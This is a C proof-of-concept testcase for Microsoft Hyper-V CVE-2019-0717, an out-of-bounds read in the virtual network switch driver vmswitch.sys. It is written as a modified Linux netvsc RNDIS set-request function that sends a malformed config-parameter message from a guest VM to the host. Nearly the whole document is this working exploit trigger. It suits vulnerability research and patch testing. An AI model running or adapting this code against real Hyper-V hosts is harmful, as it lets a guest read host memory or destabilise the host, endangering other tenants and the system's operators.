/* 
	Proof-of-concept testcase for Microsoft Hyper-V CVE-2019-0717
	Virtual Network Switch (vmswitch.sys) VmsMpCommonPvtSetRequestCommon Out-of-bounds Read Vulnerability
	Discovered independently by Alisa Esage, reported to Microsoft by someone else
	URL: https://0days.engineer
*/

int bug_VmsMpCommonPvtSetRequestCommon(struct netvsc_device *nvdev,
	const char *mac)
{
	struct rndis_device *rdev = nvdev->extension;
	struct rndis_request *request;
	struct rndis_set_request *set;
	struct rndis_config_parameter_info *cpi;
	wchar_t *cfg_nwadr, *cfg_mac;
	struct rndis_set_complete *set_complete;
	char macstr[2*ETH_ALEN+1];
	u32 extlen = sizeof(struct rndis_config_parameter_info) +
	6;
	int ret;

	request = get_rndis_request(rdev, RNDIS_MSG_SET,
    	RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);
	if (!request)
    	return -ENOMEM;

	set = &request->request_msg.msg.set_req;
	set->oid = RNDIS_OID_GEN_RNDIS_CONFIG_PARAMETER;
	set->info_buflen = extlen;
	set->info_buf_offset = sizeof(struct rndis_set_request);
	set->dev_vc_handle = 0;

	cpi = (struct rndis_config_parameter_info *)((ulong)set +
		set->info_buf_offset);
	cpi->parameter_name_offset =
		sizeof(struct rndis_config_parameter_info) + 6;
	/* Multiply by 2 because host needs 2 bytes (utf16) for each char */
	cpi->parameter_name_length = 0;
	cpi->parameter_type = RNDIS_CONFIG_PARAM_TYPE_STRING;
	cpi->parameter_value_offset =
		cpi->parameter_name_offset;
	/* Multiply by 4 because each MAC byte displayed as 2 utf16 chars */
	cpi->parameter_value_length = 0;

	ret = rndis_filter_send_request(rdev, request);
	if (ret != 0)
    	goto cleanup;

	wait_for_completion(&request->wait_event);

	set_complete = &request->response_msg.msg.set_complete;
	if (set_complete->status != RNDIS_STATUS_SUCCESS)
    	ret = -EIO;

cleanup:
	put_rndis_request(rdev, request);
	return ret;
}
